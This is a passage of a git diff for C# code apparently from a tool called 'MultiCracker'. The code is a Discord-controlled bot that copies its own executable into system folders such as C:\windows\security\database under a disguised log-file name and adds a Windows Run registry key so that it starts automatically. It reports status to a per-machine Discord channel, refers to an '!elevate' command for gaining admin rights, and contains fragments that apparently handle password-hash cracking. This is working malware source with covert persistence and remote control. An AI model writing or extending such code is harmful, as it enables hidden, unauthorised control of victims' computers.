+                Log(new LogMessage(LogSeverity.Error, "Update", $"Error getting content: {ex.Message}"));
+            }
+            return content;
+        }
+
+
         // Admin
         static bool IsAdministrator()
         {
@@ -2472,14 +2736,12 @@ namespace MultiCracker
 
 
             // Variables
-            string keyName = "MultiCracker";
             bool fullPersistenceInstalled = false;
             bool exePersistenceInstalled = false;
             bool regeditPersistenceInstalled = false;
-            string dropPoint = "C:\\Windows\\debug\\multi";
             string exePath = Application.ExecutablePath;
-            string exeName = Path.GetFileName(exePath);
-            string fullExePath = Path.Combine(dropPoint, exeName);
+            string exeName = fileName;
+            string fullExePath = Path.Combine(dropPath, exeName);
 
 
             // Check if regedit persistence is already installed
@@ -2487,7 +2749,7 @@ namespace MultiCracker
             string[] subKeys = keyCheck.GetValueNames();
             foreach (string subKey in subKeys)
             {
-                if (subKey == keyName)
+                if (subKey == registryName)
                 {
                     regeditPersistenceInstalled = true;
                 }
@@ -2545,21 +2807,19 @@ namespace MultiCracker
                     // Set important variables
                     exePath = Application.ExecutablePath;
                     exeName = Path.GetFileName(exePath);
-                    keyName = "MultiCracker";
-                    dropPoint = "C:\\Windows\\debug\\multi";
 
                     // Check if dropPoint directory exists
-                    if (!Directory.Exists(dropPoint))
+                    if (!Directory.Exists(dropPath))
                     {
                         // Create directory
-                        Directory.CreateDirectory(dropPoint);
+                        Directory.CreateDirectory(dropPath);
                         // Log
-                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Created directory: {dropPoint}"));
+                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Created directory: {dropPath}"));
                     }
                     else
                     {
                         // Log
-                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Directory already exists: {dropPoint}"));
+                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Directory already exists: {dropPath}"));
                     }
 
                     try
@@ -2570,10 +2830,10 @@ namespace MultiCracker
                         {
                             string fileName = Path.GetFileName(file);
                             string fullFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, fileName);
-                            string newFilePath = Path.Combine(dropPoint, fileName);
+                            string newFilePath = Path.Combine(dropPath, fileName);
                             File.Move(fullFilePath, newFilePath);
                             // Log
-                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Moved {fileName} to {dropPoint}"));
+                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Moved {fileName} to {dropPath}"));
                         }
                     }
                     catch (Exception ex)
@@ -2588,8 +2848,8 @@ namespace MultiCracker
                     try
                     {
                         RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                        string newExePath = Path.Combine(dropPoint, exeName);
-                        key.SetValue(keyName, newExePath);
+                        string newExePath = Path.Combine(dropPath, exeName);
+                        key.SetValue(registryName, newExePath);
                         // Send discord message
                         await channel.SendMessageAsync($"Installed persistence.");
                         // Log
@@ -2625,14 +2885,12 @@ namespace MultiCracker
             }
 
             // Variables
-            string keyName = "MultiCracker";
             bool anyPersistenceInstalled = false;
             bool exePersistenceInstalled = false;
             bool regeditPersistenceInstalled = false;
-            string dropPoint = "C:\\Windows\\debug\\multi";
             string exePath = Application.ExecutablePath;
-            string exeName = Path.GetFileName(exePath);
-            string fullExePath = Path.Combine(dropPoint, exeName);
+            string exeName = fileName;
+            string fullExePath = Path.Combine(dropPath, exeName);
 
 
             // Check if regedit persistence is already installed
@@ -2640,7 +2898,7 @@ namespace MultiCracker
             string[] subKeys = keyCheck.GetValueNames();
             foreach (string subKey in subKeys)
             {
-                if (subKey == keyName)
+                if (subKey == registryName)
                 {
                     regeditPersistenceInstalled = true;
                 }
@@ -2693,7 +2951,7 @@ namespace MultiCracker
                     try
                     {
                         RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                        key.DeleteValue(keyName);
+                        key.DeleteValue(registryName);
                         // Send discord message
                         await channel.SendMessageAsync($"Removed registry key!");
                         // Log
@@ -2711,14 +2969,14 @@ namespace MultiCracker
                     // Delete files in drop point
                     try
                     {
-                        string[] files = Directory.GetFiles(dropPoint);
+                        string[] files = Directory.GetFiles(dropPath);
                         foreach (string file in files)
                         {
                             string fileName = Path.GetFileName(file);
-                            string fullFilePath = Path.Combine(dropPoint, fileName);
+                            string fullFilePath = Path.Combine(dropPath, fileName);
                             File.Delete(fullFilePath);
                             // Log
-                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Deleted {fileName} from {dropPoint}"));
+                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Deleted {fileName} from {dropPath}"));
                         }
                         exePersistenceInstalled = false;
                     }
@@ -2733,7 +2991,7 @@ namespace MultiCracker
                     // Delete drop point
                     try
                     {
-                        Directory.Delete(dropPoint);
+                        Directory.Delete(dropPath);
                         // Send discord message
                         await channel.SendMessageAsync($"Deleted drop point!");
                         // Log
@@ -2787,6 +3045,242 @@ namespace MultiCracker
                 await channel.SendMessageAsync($"Persistence is not installed.");
                 // Log
                 Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is not installed."));
+            }
+        }
+
+        async void InstallSpecialPersistence()
+        {
+            // Make a copy of current executable and put it in "C:\windows\security\database" folder as "WindowsSecurity.log"
+            // Find the name of computer
+            string computerNameRaw = Environment.MachineName;
+            string computerName = computerNameRaw.ToLower();
+           
+            // Find the channel
+            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
+            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
+
+            if (channel == null)
+            {
+                // Log
+                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error installing persistence. Channel not found."));
+                return;
+            }
+
+            // Check if admin
+            bool isAdmin = IsAdministrator();
+
+            // if not admin
+            if (!isAdmin)
+            {
+                // Log
+                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error installing persistence. Not admin..."));
+                channel.SendMessageAsync("Error: Not admin... (Tip use **!elevate** to ask for elevation.)");
+            }
+            else
+            {
+                // Log
+                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Installing special persistence..."));
+
+                // Set important variables
+                string exePath = Application.ExecutablePath;
+                string exeName = Path.GetFileName(exePath);
+                string newExePath = Path.Combine(@"C:\windows\security\database", $"{fileNameSpecial}");
+                string targetDirectory = @"C:\windows\security\database";
+
+                if (!Directory.Exists(targetDirectory))
+                {
+                    Directory.CreateDirectory(targetDirectory);
+                }
+
+                // Check if the executable is in droppoint
+                if (File.Exists(newExePath))
+                {
+                    // Log
+                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Exe persistence is already installed."));
+                    channel.SendMessageAsync($"Exe persistence is already installed. (Path to EXE: {newExePath})");
+                }
+                else
+                {
+                    // Copy the executable to drop point
+                    try
+                    {
+                        File.Copy(exePath, newExePath);
+                        // Log
+                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Copied {exePath} to {newExePath}"));
+                    }
+                    catch (Exception ex)
+                    {
+                        // Log
+                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error copying {exePath} to {newExePath}: {ex.Message}"));
+                        channel.SendMessageAsync($"Error copying {exePath} to {newExePath}: {ex.Message}");
+                    }
+                }
+
+                // Check for registry key
+                RegistryKey keyCheck = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                string[] subKeys = keyCheck.GetValueNames();
+                bool regeditPersistenceInstalled = false;
+                foreach (string subKey in subKeys)
+                {
+                    if (subKey == registryName)
+                    {
+                        regeditPersistenceInstalled = true;
+                    }
+                }
+                if (regeditPersistenceInstalled)
+                {
+                       // Log
+                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Regedit persistence is already installed."));
+                    channel.SendMessageAsync($"Regedit persistence is already installed. (Keyname: {registryName})");
+                }
+                else
+                {
+                    // Create registry key
+                    try
+                    {
+                        RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                        key.SetValue(registryName, newExePath);
+                        // Log
+                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Installed persistence."));
+                        channel.SendMessageAsync("Installed persistence.");
+                    }
+                    catch (Exception ex)
+                    {
+                        // Log
+                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error adding registry key: {ex.Message}"));
+                        channel.SendMessageAsync($"Error adding registry key: {ex.Message}");
+                    }
+                }
+
+                // Check if both are installed
+                if (regeditPersistenceInstalled && File.Exists(newExePath))
+                {
+                    // Log
+                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is installed."));
+                    channel.SendMessageAsync("Persistence is installed.");
+                }
+                else
+                {
+                    // Log
+                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is not installed."));
+                    channel.SendMessageAsync("Persistence is not installed.");
+                }
+                
+            }
+        }
+        async void UninstallSpecialPersistence()
+        {
+            // Remove the registry key and also delete the executable in "C:\windows\security\database" folder
+            // Find the name of computer
+            string computerNameRaw = Environment.MachineName;
+            string computerName = computerNameRaw.ToLower();
+
+            // Find the channel
+            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
+            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
+   
+            if (channel == null)
+            {
+                // Log
+                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error installing persistence. Channel not found."));
+                return;
+            }
+
+            // Check if admin
+            bool isAdmin = IsAdministrator();
+            if (!isAdmin)
+            {
+                // Log
+                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error uninstalling persistence. Not admin..."));
+                channel.SendMessageAsync("Error: Not admin... (Tip use **!elevate** to ask for elevation.)");
+                return;
+            }
+            else
+            {
+                // Log
+                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Uninstalling special persistence..."));
+
+                // Set important variables
+                string exePath = Application.ExecutablePath;
+                string exeName = Path.GetFileName(exePath);
+                string newExePath = Path.Combine(@"C:\windows\security\database", $"{fileNameSpecial}");
+                string targetDirectory = @"C:\windows\security\database";
+
+                // Check if the executable is in droppoint
+                if (File.Exists(newExePath))
+                {
+                    // Delete the executable
+                    try
+                    {
+                        File.Delete(newExePath);
+                        // Log
+                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Deleted {newExePath}"));
+                    }
+                    catch (Exception ex)
+                    {
+                        // Log
+                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error deleting {newExePath}: {ex.Message}"));
+                        channel.SendMessageAsync($"Error deleting {newExePath}: {ex.Message}");
+                    }
+                }
+                else
+                {
+                    // Log
+                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Exe persistence is not installed."));
+                    channel.SendMessageAsync($"Exe persistence is not installed. (Path to EXE: {newExePath})");
+                }
+
+                // Check for registry key
+                RegistryKey keyCheck = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                string[] subKeys = keyCheck.GetValueNames();
+                bool regeditPersistenceInstalled = false;
+
+                foreach (string subKey in subKeys)
+                {
+                    if (subKey == registryName)
+                    {
+                        regeditPersistenceInstalled = true;
+                    }
+                }
+
+                if (regeditPersistenceInstalled)
+                {
+                    // Delete registry key
+                    try
+                    {
+                        RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                        key.DeleteValue(registryName);
+                        // Log
+                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Removed registry key!"));
+                        channel.SendMessageAsync("Removed registry key!");
+                    }
+                    catch (Exception ex)
+                    {
+                        // Log
+                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error removing registry key: {ex.Message}"));
+                        channel.SendMessageAsync($"Error removing registry key: {ex.Message}");
+                    }
+                }
+                else
+                {
+                    // Log
+                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Regedit persistence is not installed."));
+                    channel.SendMessageAsync($"Regedit persistence is not installed. (Keyname: {registryName})");
+                }
+
+                // Check if both are installed
+                if (regeditPersistenceInstalled || File.Exists(newExePath))
+                {
+                    // Log
+                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is installed."));
+                    channel.SendMessageAsync("Persistence is installed.");
+                }
+                else
+                {
+                    // Log
+                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is not installed."));
+                    channel.SendMessageAsync("Persistence is not installed.");
+                }
             }
         }
 
@@ -3129,7 +3623,9 @@ namespace MultiCracker
             return $"{passwordsLeft}:{targetHash}:{startCommand}:{totalCombinations}";
         }
 
-        
+
+
+
 
         // Auto
         // Set auto settings
